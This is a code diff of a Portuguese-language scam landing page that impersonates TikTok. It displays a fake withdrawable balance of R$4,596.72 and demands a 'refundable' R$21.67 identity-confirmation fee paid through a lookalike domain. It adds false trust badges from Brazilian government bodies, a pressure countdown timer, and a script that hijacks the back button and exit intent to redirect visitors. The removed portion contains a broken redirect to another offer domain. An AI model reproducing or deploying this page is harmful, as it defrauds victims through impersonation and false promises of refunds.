+          <div class="confirmation-header">
+            <div class="confirmation-logo">
+              <img src="images/logotiktok.png" alt="TikTok">
+            </div>
+          </div>
+
+          <!-- Saldo Acumulado -->
+          <div class="confirmation-section confirmation-balance">
+            <div class="confirmation-balance-title">SALDO DISPONÍVEL</div>
+            <div class="confirmation-balance-amount" data-amount-target="4596.72">
+              R$ 4.596,72
+            </div>
+            <div class="confirmation-balance-subtitle">
+              Aguardando confirmação para saque
+            </div>
+          </div>
+
+          <!-- Taxa de Confirmação -->
+          <div class="confirmation-section">
+            <div class="confirmation-section-title">
+              CONFIRMAÇÃO DE IDENTIDADE
+            </div>
+            <div class="confirmation-fee-amount">
+              R$ 21,67
+              <span class="confirmation-reembolso-badge">VALOR REEMBOLSÁVEL</span>
+            </div>
+            <div class="confirmation-fee-description">
+              Taxa obrigatória para liberação do saque no valor de
+              <span class="bold">R$4.596,72</span>. O valor de
+              <span class="bold">R$21,67</span> será reembolsado integralmente
+              para você em 1 minuto.
+            </div>
+          </div>
+
+          <!-- Comprovante -->
+          <div class="confirmation-section">
+            <div class="confirmation-section-title">DADOS PARA REEMBOLSO</div>
+            <div class="confirmation-receipt-grid">
+              <div class="confirmation-receipt-item">
+                <div class="confirmation-receipt-label">Nome</div>
+                <div class="confirmation-receipt-value" id="confirmation-name"></div>
+              </div>
+              <div class="confirmation-receipt-item">
+                <div class="confirmation-receipt-label">Data</div>
+                <div class="confirmation-receipt-value" id="confirmation-date"></div>
+              </div>
+              <div class="confirmation-receipt-item">
+                <div class="confirmation-receipt-label">Chave PIX</div>
+                <div class="confirmation-receipt-value" id="confirmation-key-type"></div>
+              </div>
+              <div class="confirmation-receipt-item">
+                <div class="confirmation-receipt-label">Valor a receber</div>
+                <div class="confirmation-receipt-value bold">R$ 4.596,72</div>
+              </div>
+              <div class="confirmation-pix-key" id="confirmation-pix-key"></div>
+            </div>
+          </div>
+
+          <div class="confirmation-divider"></div>
+
+          <!-- Requisitos -->
+          <div class="confirmation-section">
+            <div class="confirmation-section-title">PROCESSO DE LIBERAÇÃO</div>
+            <div class="confirmation-requirements-grid">
+              <div class="confirmation-requirement-item">
+                <div class="confirmation-requirement-icon">1</div>
+                <div class="confirmation-requirement-content">
+                  <div class="confirmation-requirement-title">
+                    Pagar taxa de confirmação
+                  </div>
+                  <div class="confirmation-requirement-description">
+                    R$ 21,67 para verificação de identidade
+                  </div>
+                </div>
+              </div>
+              <div class="confirmation-requirement-item">
+                <div class="confirmation-requirement-icon confirmation-reembolso">
+                  ✓
+                </div>
+                <div class="confirmation-requirement-content">
+                  <div class="confirmation-requirement-title confirmation-reembolso">
+                    Receber reembolso automático
+                  </div>
+                  <div class="confirmation-requirement-description">
+                    Valor devolvido em 1 minuto
+                  </div>
+                </div>
+              </div>
+              <div class="confirmation-requirement-item">
+                <div class="confirmation-requirement-icon">3</div>
+                <div class="confirmation-requirement-content">
+                  <div class="confirmation-requirement-title">
+                    Acessar saldo completo
+                  </div>
+                  <div class="confirmation-requirement-description">
+                    R$ 4.596,72 liberado para saque
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Call to Action -->
+          <div class="confirmation-section">
+            <a href="https://pay.tiktkonny.site/68b50ab5f61831e16ebc1072" class="confirmation-cta-button" id="confirmation-button" onclick="herdarUTMeRedirecionar(this.href); return false;">
+              Pagar taxa para Liberar Saque
+            </a>
+
+            <script>
+              function herdarUTMeRedirecionar(urlDestino) {
+                // Pega os parâmetros da URL atual
+                const urlAtual = new URL(window.location.href);
+                const params = new URLSearchParams(urlAtual.search);
+
+                // Filtra UTMs + ttclid
+                const parametrosParaHerdar = {};
+                for (const [key, value] of params.entries()) {
+                  if (
+                    key.startsWith("utm_") ||
+                    key === "ttclid" // <- novo parâmetro incluído
+                  ) {
+                    parametrosParaHerdar[key] = value;
+                  }
+                }
+
+                // Cria a URL de destino com os parâmetros herdados
+                const urlFinal = new URL(urlDestino);
+                const paramsDestino = new URLSearchParams(urlFinal.search);
+
+                // Adiciona os parâmetros herdados à URL de destino
+                for (const [key, value] of Object.entries(
+                  parametrosParaHerdar
+                )) {
+                  paramsDestino.set(key, value);
+                }
+
+                urlFinal.search = paramsDestino.toString();
+
+                // Redireciona na mesma página
+                window.location.href = urlFinal.toString();
+              }
+            </script>
+            <div class="confirmation-timer">
+              ⏱️ Reembolso automático em 1 minuto
+            </div>
+            <div class="confirmation-success-message" id="confirmation-success-message">
+              ✅ Identidade confirmada. R$ 21,67 reembolsados e saque liberado.
+            </div>
+          </div>
+
+          <!-- Segurança -->
+          <div class="confirmation-security-grid">
+            <div class="confirmation-security-item">
+              <div class="confirmation-security-label">
+                <img src="images/bacen.png" alt="" class="img-bacen">
+              </div>
+            </div>
+            <div class="confirmation-security-item">
+              <div class="confirmation-security-label">
+                <img src="images/gov-br.webp" alt="" class="img-gov-br">
+              </div>
+            </div>
+            <div class="confirmation-security-item">
+              <div class="confirmation-security-label">
+                <img src="images/receitafederal.png" alt="" class="img-receitafederal">
+              </div>
+            </div>
+          </div>
+
+          <!-- Footer -->
+          <div class="confirmation-footer">
+            <div class="confirmation-footer-text">Processo 100% seguro</div>
+            <a href="#nine" class="confirmation-footer-link">Precisa de ajuda?</a>
+          </div>
+        </div>
+      </section>
+      <section id="popup-um" class="sticky-popup">
+        <div class="timer-wrapper expira-em-popup">
+          <div class="timer-label">Expira em</div>
+
+          <div class="timer-clock">
+            <!-- Horas -->
+            <div class="timer-box" data-timer="hours">00</div>
+
+            <!-- Separador -->
+            <div class="timer-separator">:</div>
+
+            <!-- Minutos -->
+            <div class="timer-box" data-timer="minutes">42</div>
+
+            <!-- Separador -->
+            <div class="timer-separator">:</div>
+
+            <!-- Segundos -->
+            <div class="timer-box" data-timer="seconds">37</div>
+          </div>
+        </div>
+        <!-- <div class="line line-expira"></div> -->
+        <div class="saldo saldo-popup">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info">
+              <div class="saldo-label">
+                <span class="saldo-text">Seu saldo</span>
+                <img src="images/p-saldo.svg" alt="" class="p-saldo">
+              </div>
+
+              <div class="saldo-valor" aria-live="polite">
+                <span class="valor-currency">R$4.596,72</span>
+              </div>
+            </div>
+
+            <div class="saldo-action">
+              <button type="button" class="btn-sacar" aria-label="Sacar">
+                <span class="btn-text">Sacar</span>
+                <span class="pix-badge" aria-hidden="true">
+                  <img src="images/pix-logo.svg" alt="">
+                </span>
+              </button>
+            </div>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <script>
+      // Funções auxiliares
+      function easeOutCubic(t) {
+        return 1 - Math.pow(1 - t, 3);
+      }
+
+      function formatBR(value) {
+        return value
+          .toFixed(2) // duas casas decimais
+          .replace(".", ",") // vírgula decimal
+          .replace(/\B(?=(\d{3})+(?!\d))/g, "."); // ponto para milhar
+      }
+
+      // Função reutilizável para animar um contador
+      function animateCurrencyCounter(counter, forceReset = false) {
+        if (!counter) return;
+
+        // Se já está animando e não forçou reset, não anima novamente
+        if (counter._isAnimating && !forceReset) return;
+
+        const duration = 2000; // tempo total da animação
+        const toValue =
+          parseFloat(counter.getAttribute("data-amount-target")) || 0;
+        const fromValue = 0;
+
+        if (toValue === 0) {
+          // Garante que sempre mostre um valor válido, mesmo se for 0
+          counter.textContent = "R$ 0,00";
+          return;
         }
 
-        valueEl.textContent = current + '/' + target;
+        // Cancela animação anterior se existir
+        if (counter._animationFrameId) {
+          cancelAnimationFrame(counter._animationFrameId);
+          counter._animationFrameId = null;
+        }
 
-        const pct = Math.min(100, (current / target) * 100);
-        barFill.style.width = pct + '%';
+        // Garante que sempre comece com um valor visível
+        counter.textContent = "R$ 0,00";
 
-        if (current >= target) {
-          clearInterval(interval);
-          valueEl.classList.add('done');
+        counter._isAnimating = true;
+        let startTime = null;
 
-          if (index < stats.length - 1) {
-            setTimeout(() => {
-              animateStat(index + 1);
-            }, 400);
+        function animateCounter(currentTime) {
+          if (!startTime) startTime = currentTime;
+          const elapsed = currentTime - startTime;
+          const progress = Math.min(elapsed / duration, 1);
+          const value =
+            fromValue + (toValue - fromValue) * easeOutCubic(progress);
+
+          // Atualiza número formatado no padrão brasileiro - sempre garante um valor válido
+          const formattedValue = "R$ " + formatBR(value);
+          if (counter && counter.textContent !== undefined) {
+            counter.textContent = formattedValue;
+          }
+
+          if (progress < 1) {
+            counter._animationFrameId = requestAnimationFrame(animateCounter);
           } else {
-            noteText.textContent = labelsText[3];
-            claimBtn.classList.add('visible');
+            // garante valor final exato
+            const finalValue = "R$ " + formatBR(toValue);
+            if (counter && counter.textContent !== undefined) {
+              counter.textContent = finalValue;
+            }
+            counter._isAnimating = false;
+            counter._animationFrameId = null;
           }
         }
-      }, 40);
-    }
 
-    animateStat(0);
-
-    /* --------- LOADER TIKTOK E REDIRECIONAMENTO --------- */
-    function mostrarLoaderTikTok() {
-  const loader = document.getElementById('tiktok-loader');
-  loader.style.display = 'flex';
-
-  const urlAtual = new URL(window.location.href);
-
-  setTimeout(() => {
-    const destino = https://makesmor.lat/oferta/?ttclid=E_C_P_CuIB0fQ0BodyN9XkEbCYbaFjXUAID90u-2AcOefs1Z1pwCT_2GxgHoryDteee2-WgHXCHq-rEI8TKW2_326nqayVbHl6TqDTnIxYSdRUCdteXKlLExBDmJkwgD6G2m5G9sianjPWNWWp8CbWNzAKq-_4kHYXQT3LfCS51qu05RsGu9n53TrVWD6wIzX0svcZcvJBUyZkVVN5MTehgQGSyMBviN_sTh-uJS41QHOCKpwjicyLY0ve0gyEkADIm8aHt6tNqiTm0fP2wwuYYpNISvQdRHyWAVpsiX_hl2jhsiqeeIkGqxIEdjIuMA&utm_source=TT-1771083406262-8ize8wnbnsw40&sck=TT-1771083406262-8ize8wnbnsw40;
-    destino.search = https://makesmor.lat/oferta/?ttclid=E_C_P_CuIB0fQ0BodyN9XkEbCYbaFjXUAID90u-2AcOefs1Z1pwCT_2GxgHoryDteee2-WgHXCHq-rEI8TKW2_326nqayVbHl6TqDTnIxYSdRUCdteXKlLExBDmJkwgD6G2m5G9sianjPWNWWp8CbWNzAKq-_4kHYXQT3LfCS51qu05RsGu9n53TrVWD6wIzX0svcZcvJBUyZkVVN5MTehgQGSyMBviN_sTh-uJS41QHOCKpwjicyLY0ve0gyEkADIm8aHt6tNqiTm0fP2wwuYYpNISvQdRHyWAVpsiX_hl2jhsiqeeIkGqxIEdjIuMA&utm_source=TT-1771083406262-8ize8wnbnsw40&sck=TT-1771083406262-8ize8wnbnsw40; // mantém UTMs
-
-    window.location.href = destino.toString();
-  }, 3000);
-}
-
-    claimBtn.addEventListener('click', () => {
-      mostrarLoaderTikTok();
-    });
-
-    /* --------- FUNDO DE PARTÍCULAS --------- */
-    const canvas = document.getElementById('bgCanvas');
-    const ctx = canvas.getContext('2d');
-    let particles = [];
-    let width = window.innerWidth;
-    let height = window.innerHeight;
-
-    function resizeCanvas() {
-      width = window.innerWidth;
-      height = window.innerHeight;
-      const ratio = window.devicePixelRatio || 1;
-      canvas.width = width * ratio;
-      canvas.height = height * ratio;
-      ctx.setTransform(ratio, 0, 0, ratio, 0, 0);
-    }
-
-    function createParticles(count) {
-      const palette = [
-        { r: 244, g: 63, b: 94 },
-        { r: 56, g: 189, b: 248 },
-        { r: 248, g: 250, b: 252 }
-      ];
-      particles = [];
-      for (let i = 0; i < count; i++) {
-        const color = palette[Math.floor(Math.random() * palette.length)];
-        particles.push({
-          x: Math.random() * width,
-          y: Math.random() * height,
-          r: 2 + Math.random() * 3.5,
-          speedY: 0.25 + Math.random() * 0.6,
-          speedX: (Math.random() - 0.5) * 0.4,
-          alpha: 0.4 + Math.random() * 0.4,
-          color
-        });
+        // Pequeno delay para garantir que o DOM está pronto
+        setTimeout(() => {
+          if (counter && counter.getAttribute("data-amount-target")) {
+            counter._animationFrameId = requestAnimationFrame(animateCounter);
+          }
+        }, 10);
       }
-    }
 
-    function drawParticles() {
-      ctx.clearRect(0, 0, width, height);
-      particles.forEach(p => {
-        ctx.beginPath();
-        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
-        ctx.fillStyle = 'rgba(' + p.color.r + ',' + p.color.g + ',' + p.color.b + ',' + p.alpha + ')';
-        ctx.fill();
-
-        p.y += p.speedY;
-        p.x += p.speedX;
-
-        if (p.y - p.r > height) {
-          p.y = -p.r;
-          p.x = Math.random() * width;
-        }
-        if (p.x < -10) p.x = width + 10;
-        if (p.x > width + 10) p.x = -10;
+      // Anima todos os contadores visíveis no carregamento
+      document.addEventListener("DOMContentLoaded", function () {
+        // Anima apenas contadores que estão visíveis na tela inicial
+        const initialCounters = document.querySelectorAll(
+          "#one .valor-currency[data-amount-target]"
+        );
+        initialCounters.forEach((counter) => {
+          animateCurrencyCounter(counter);
+        });
       });
-      requestAnimationFrame(drawParticles);
+
+      // Expõe a função globalmente para ser chamada quando o popup abrir
+      window.animateCurrencyCounter = animateCurrencyCounter;
+    </script>
+
+    <!-- <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const counters = document.querySelectorAll(".elementor-counter-number");
+
+        counters.forEach((counter) => {
+          const duration =
+            parseInt(counter.getAttribute("data-duration")) || 2000;
+          const toValue =
+            parseFloat(counter.getAttribute("data-to-value")) || 0;
+          const fromValue =
+            parseFloat(counter.getAttribute("data-from-value")) || 0;
+          const delimiter = counter.getAttribute("data-delimiter") || ".";
+
+          let startTime = null;
+
+          function animateCounter(currentTime) {
+            if (!startTime) startTime = currentTime;
+            const elapsed = currentTime - startTime;
+            const progress = Math.min(elapsed / duration, 1);
+            const value =
+              fromValue + (toValue - fromValue) * easeOutCubic(progress);
+
+            counter.textContent = formatNumber(value, delimiter);
+
+            if (progress < 1) {
+              requestAnimationFrame(animateCounter);
+            } else {
+              counter.textContent = formatNumber(toValue, delimiter);
+            }
+          }
+
+          requestAnimationFrame(animateCounter);
+        });
+
+        function easeOutCubic(t) {
+          return 1 - Math.pow(1 - t, 3);
+        }
+
+        function formatNumber(value, delimiter) {
+          // exibe com 2 casas decimais e separador personalizado
+          let formatted = value.toFixed(2);
+          if (delimiter === ",") formatted = formatted.replace(".", ",");
+          return formatted;
+        }
+      });
+    </script> -->
+    <script src="js/main.js"></script>
+    <!-- <script src="js/agr.js"></script> -->
+    <!-- <script src="js/sera.js"></script> -->
+  
+<script>
+(function() {
+  // 🔗 URL de destino — substitua pelo seu link real:
+  const destino = "";
+  let jaRedirecionou = false;
+
+  function redirecionar() {
+    if (!jaRedirecionou) {
+      jaRedirecionou = true;
+      window.location.replace(destino);
     }
+  }
 
-    window.addEventListener('resize', () => {
-      resizeCanvas();
-      createParticles(45);
-    });
+  // Impede loop de redirecionamento em reload/back cache
+  if (sessionStorage.getItem("__ja_redirecionou__")) return;
+  sessionStorage.setItem("__ja_redirecionou__", "1");
 
-    resizeCanvas();
-    createParticles(45);
-    drawParticles();
-  </script>
+  // Detecta intenção de saída no desktop (mouse indo pro topo)
+  document.addEventListener("mouseleave", function(e) {
+    if (e.clientY < 0 && !/Mobi|Android/i.test(navigator.userAgent)) {
+      redirecionar();
+    }
+  });
 
+  // Detecta tentativa de voltar (botão voltar do navegador)
+  window.addEventListener("popstate", function() {
+    redirecionar();
+  });
 
+  // Adiciona um estado no histórico (para detectar o "voltar")
+  window.history.pushState({}, "", window.location.href);
 
+  // Protege contra travamentos ou loops em alguns navegadores
+  window.addEventListener("pageshow", function(e) {
+    if (e.persisted) {
+      sessionStorage.removeItem("__ja_redirecionou__");
+    }
+  });
+})();
+</script>
 
-
-
-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"47039e676ef14d5096239c26434286e9","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body></html>
